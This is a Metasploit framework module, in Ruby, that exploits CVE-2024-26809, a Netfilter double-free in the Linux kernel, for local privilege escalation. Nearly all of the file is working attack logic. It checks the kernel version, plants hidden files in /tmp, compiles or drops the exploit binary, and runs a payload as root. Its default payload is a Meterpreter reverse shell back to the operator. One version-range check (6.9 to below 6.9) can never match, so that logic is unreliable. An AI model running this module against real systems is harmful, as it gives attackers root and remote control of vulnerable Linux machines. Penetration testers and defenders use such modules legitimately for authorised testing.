##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netfilter nft_set_pipapo Offset-less LPE (CVE-2024-26809)',
        'Description' => %q{
          This module exploits CVE-2024-26809, a double-free in the
          Netfilter nft_set_pipapo subsystem that allows local users to
          escalate privileges to root without requiring kernel symbols.

          If the target has `gcc`, the original OtterSec PoC is uploaded
          and compiled in place; otherwise a bundled pre-built x86-64
          binary is used.  After privilege escalation the module executes
          a payload ELF with full root privileges.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'OtterSec',      # Original exploit
          'JohannesLks (Lukas Johannes Möller)'    # Metasploit module
        ],
        'DisclosureDate' => '2024-04-04',
        'Platform'       => [ 'linux' ],
        'Arch'           => [ ARCH_X64 ],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        => [['Automatic', {}]],
        'DefaultTarget'  => 0,
        'DefaultOptions' => {
          'PAYLOAD'       => 'linux/x64/meterpreter/reverse_tcp',
          'PrependSetuid' => true,
          'PrependFork'   => true,
          # PrependSetresuid relies on libc support; disable if in doubt
          # 'PrependSetresuid' => true,
          'AppendExit'    => true
        },
        'Privileged'     => true,
        'References'     => [
          ['CVE', '2024-26809'],
          ['URL',  'https://nvd.nist.gov/vuln/detail/CVE-2024-26809'],
          ['URL',  'https://osec.io/blog/2024-11-25-netfilter-universal-root-1-day/'],
          ['URL',  'https://github.com/otter-sec/OtterRoot']
        ],
        'Notes' => {
          'Reliability'  => [ REPEATABLE_SESSION ],
          'Stability'    => [ CRASH_SAFE ],
          'SideEffects'  => [ ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([
      OptString.new('WRITABLE_DIR',
                    [ true,
                      'Directory on the target where temporary files can be written',
                      '/tmp' ])
    ])
  end

  #
  # Return CheckCode depending on kernel release.
  #
  # Vulnerable window (approximate):
  #   * ≥ 5.15.54  and   < 5.15.153
  #   * ≥ 6.0.0    and   < 6.6.23
  #   * ≥ 6.7.0    and   < 6.7.11
  #   * ≥ 6.8.0    and   < 6.8.2
  #   * 6.9-rc0
  #
  def check
    return CheckCode::Safe('Not a Linux session')   unless session.platform =~ /linux/i
    return CheckCode::Safe('Not a 64-bit kernel')   unless kernel_arch.include?('x86_64')

    rel_string = kernel_release.split('-').first
    kernel_ver = Rex::Version.new(rel_string)

    vuln =
      (kernel_ver >= Rex::Version.new('5.15.54') && kernel_ver < Rex::Version.new('5.15.153')) ||
      (kernel_ver >= Rex::Version.new('6.0')      && kernel_ver < Rex::Version.new('6.6.23')) ||
      (kernel_ver >= Rex::Version.new('6.7')      && kernel_ver < Rex::Version.new('6.7.11')) ||
      (kernel_ver >= Rex::Version.new('6.8')      && kernel_ver < Rex::Version.new('6.8.2'))  ||
      (kernel_ver >= Rex::Version.new('6.9')      && kernel_ver < Rex::Version.new('6.9'))

    return CheckCode::Appears("Kernel #{rel_string} looks vulnerable") if vuln

    CheckCode::Safe("Kernel #{rel_string} is outside the known vulnerable window")
  end

  def exploit
    writable_dir = datastore['WRITABLE_DIR']
    fail_with(Failure::NoAccess, "#{writable_dir} is not writable") unless writable?(writable_dir)

    #
    # Build unique filenames
    #
    base_name    = ".#{Rex::Text.rand_text_alpha_lower(rand(6..12))}"
    exploit_src  = ::File.join(writable_dir, "#{base_name}.c")
    exploit_bin  = exploit_src.chomp('.c')
    payload_path = ::File.join(writable_dir, "#{base_name}_payload")

    #
    # Create & upload payload ELF
    #
    print_status('Generating root payload executable')
    write_file(payload_path, generate_payload_exe)
    chmod(payload_path, 0o755)
    register_file_for_cleanup(payload_path)

    #
    # Get exploit on target (compile if possible)
    #
    if has_gcc?
      print_status('Target has gcc – uploading and compiling exploit')
      c_code = exploit_data('CVE-2024-26809', 'exploit.c')
      upload_and_compile(exploit_src, c_code)
      # upload_and_compile creates <src>.o and <src>.bin; the binary
      # name is <src> without “.c”, i.e. exploit_bin
    else
      print_status('gcc unavailable – uploading bundled pre-compiled binary')
      bin_blob = exploit_data('CVE-2024-26809', 'exploit.x64.bin')
      upload_and_chmodx(exploit_bin, bin_blob)
    end

    register_file_for_cleanup(exploit_src)
    register_file_for_cleanup(exploit_bin)

    #
    # Execute exploit → launches payload with root privileges
    #
    print_status("Running exploit to execute #{payload_path}")
    output = cmd_exec("#{exploit_bin} #{payload_path}")
    print_good("Exploit ran; output follows:\n#{output}")

    #
    # Catch the new Meterpreter / shell
    #
    handler
  end
end
